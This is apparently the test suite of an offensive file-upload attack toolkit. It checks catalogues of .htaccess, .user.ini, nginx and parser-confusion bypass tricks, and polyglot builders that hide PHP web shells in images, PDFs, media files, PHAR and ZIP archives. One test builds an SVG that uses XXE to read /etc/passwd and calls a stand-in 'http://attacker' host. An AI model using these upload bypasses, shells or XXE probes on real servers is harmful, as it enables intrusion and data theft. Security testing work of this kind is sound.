"""
Payload-coverage tests. Pin both the SIZE of each catalogue and the
PROPERTIES of every entry — so future regressions can't silently shrink them.
"""
import io, pytest, zipfile
from uploadpwn import (HTACCESS_TRICKS, HTACCESS_PAYLOADS, WEBCONFIG_PAYLOADS,
                       NGINX_TRICKS, PARSER_CONFUSION, SHELLS)


# ── Catalogue size lower bounds ────────────────────────────────────────
def test_htaccess_catalogue_has_full_coverage():
    assert len(HTACCESS_TRICKS) >= 30, "htaccess catalogue regressed"


def test_webconfig_catalogue():
    assert len(WEBCONFIG_PAYLOADS) >= 8


def test_nginx_catalogue():
    assert len(NGINX_TRICKS) >= 12


def test_parser_confusion_catalogue():
    assert len(PARSER_CONFUSION) >= 18


# ── Every htaccess entry has required keys + non-empty payload ─────────
def test_htaccess_entries_well_formed():
    seen = set()
    for t in HTACCESS_TRICKS:
        for k in ("name", "filename", "payload", "requires", "verify_url"):
            assert k in t, f"trick {t} missing {k}"
        assert t["filename"] in (".htaccess", ".user.ini", "php.ini", ".htpasswd")
        assert isinstance(t["payload"], bytes) and len(t["payload"]) > 0
        assert t["payload"].endswith(b"\n"), \
            "Apache silently drops last directive without trailing newline"
        assert not t["payload"].startswith(b"\xef\xbb\xbf"), \
            "BOM in .htaccess causes HTTP 500 on every Apache version"
        assert t["name"] not in seen, f"duplicate trick name {t['name']!r}"
        seen.add(t["name"])


# ── .user.ini coverage: must exercise auto_prepend & auto_append ──────
def test_userini_coverage():
    userini = [t for t in HTACCESS_TRICKS if t["filename"] == ".user.ini"]
    assert len(userini) >= 4
    joined = b"".join(t["payload"] for t in userini)
    assert b"auto_prepend_file" in joined
    assert b"auto_append_file"  in joined
    assert b"allow_url_include" in joined


# ── SetHandler / FilesMatch must be present (modern reliable variants) ─
def test_modern_apache_tricks_present():
    names = {t["name"] for t in HTACCESS_TRICKS}
    for must in ("filesmatch_sethandler", "filesmatch_any",
                 "addhandler_php7", "addhandler_php8",
                 "rewrite_jpg_to_php", "apache24_require"):
        assert must in names, f"missing modern trick {must}"


# ── WAR / Jetty / FPM are in nginx tricks ──────────────────────────────
def test_nginx_covers_alternative_stacks():
    names = {t["name"] for t in NGINX_TRICKS}
    for must in ("nginx-pathinfo-slash-php", "nginx-newline-php",
                 "phpfpm-no-limit-extensions", "tomcat-webdav-jsp",
                 "tomcat-manager-war"):
        assert must in names


# ── Parser-confusion must include RFC 5987/2231 + NTFS ADS + null byte ─
def test_parser_confusion_covers_classics():
    names = {t["name"] for t in PARSER_CONFUSION}
    for must in ("rfc5987-filename-star", "rfc2231-continuation",
                 "ntfs-ads-DATA", "raw-null-byte-legacy",
                 "windows-trailing-dot", "double-content-type",
                 "php-cgi-argument-injection", "unicode-fullwidth-dot"):
        assert must in names, f"missing {must}"


# ── Real polyglots actually parse as images ────────────────────────────
def test_polyglots_build_and_pil_parses_images():
    from PIL import Image
    from polyglots import BUILDERS
    image_formats = {"png": "PNG", "jpg_com": "JPEG", "jpg_exif": "JPEG",
                     "jpg_icc": "JPEG", "gif": "GIF"}
    for name, expected_fmt in image_formats.items():
        data = BUILDERS[name]()
        im = Image.open(io.BytesIO(data))
        im.verify()  # raises on corruption
        im = Image.open(io.BytesIO(data))
        assert im.format == expected_fmt, f"{name} parsed as {im.format}, expected {expected_fmt}"
        assert b"<?php" in data, f"{name} polyglot lost its PHP payload"


def test_zip_polyglot_contains_shell_php():
    from polyglots import build_zip_php
    data = build_zip_php()
    # there's prepended raw PHP before the zip header; zipfile finds the CD
    z = zipfile.ZipFile(io.BytesIO(data))
    names = z.namelist()
    assert "shell.php" in names


def test_svg_polyglot_has_xxe_xinclude_and_ssrf():
    from polyglots import build_svg
    s = build_svg(xxe_path="/etc/passwd", ssrf_url="http://attacker/x")
    assert b"<!ENTITY xxe SYSTEM" in s
    assert b"xi:include" in s
    assert b'href="http://attacker' in s
    assert b"foreignObject" in s
    assert b"<script" in s


def test_phar_polyglot_starts_as_jpeg():
    from polyglots import build_phar_jpeg
    data = build_phar_jpeg()
    assert data[:3] == b"\xff\xd8\xff", "phar polyglot must begin with JPEG SOI"
    assert b"__HALT_COMPILER" in data
    assert b"GBMB" in data, "missing phar signature trailer"


def test_pdf_polyglot_valid_header_and_eof():
    from polyglots import build_pdf
    data = build_pdf()
    assert data.startswith(b"%PDF-1.")
    assert data.rstrip().endswith(b"%%EOF")
    assert b"<?php" in data


def test_docx_polyglot_is_valid_zip_with_xxe():
    from polyglots import build_docx_xxe
    data = build_docx_xxe(ssrf_url="http://x/y")
    z = zipfile.ZipFile(io.BytesIO(data))
    names = z.namelist()
    assert "word/document.xml" in names
    assert "[Content_Types].xml" in names
    doc = z.read("word/document.xml")
    assert b"<!DOCTYPE w:document" in doc
    assert b"&xxe;" in doc


def test_isobmff_polyglots_parse_ftyp():
    from polyglots import build_mp4, build_avif
    for fn in (build_mp4, build_avif):
        data = fn()
        # second box-id at offset 4 must be ftyp
        assert data[4:8] == b"ftyp"
        assert b"<?php" in data


def test_id3_polyglot_starts_with_id3():
    from polyglots import build_mp3
    data = build_mp3()
    assert data.startswith(b"ID3")
    assert b"TXXX" in data
    assert b"<?php" in data


def test_webp_polyglot_riff_chunk():
    from polyglots import build_webp
    data = build_webp()
    assert data.startswith(b"RIFF")
    assert b"WEBP" in data
    assert b"XPHP" in data
    assert b"<?php" in data
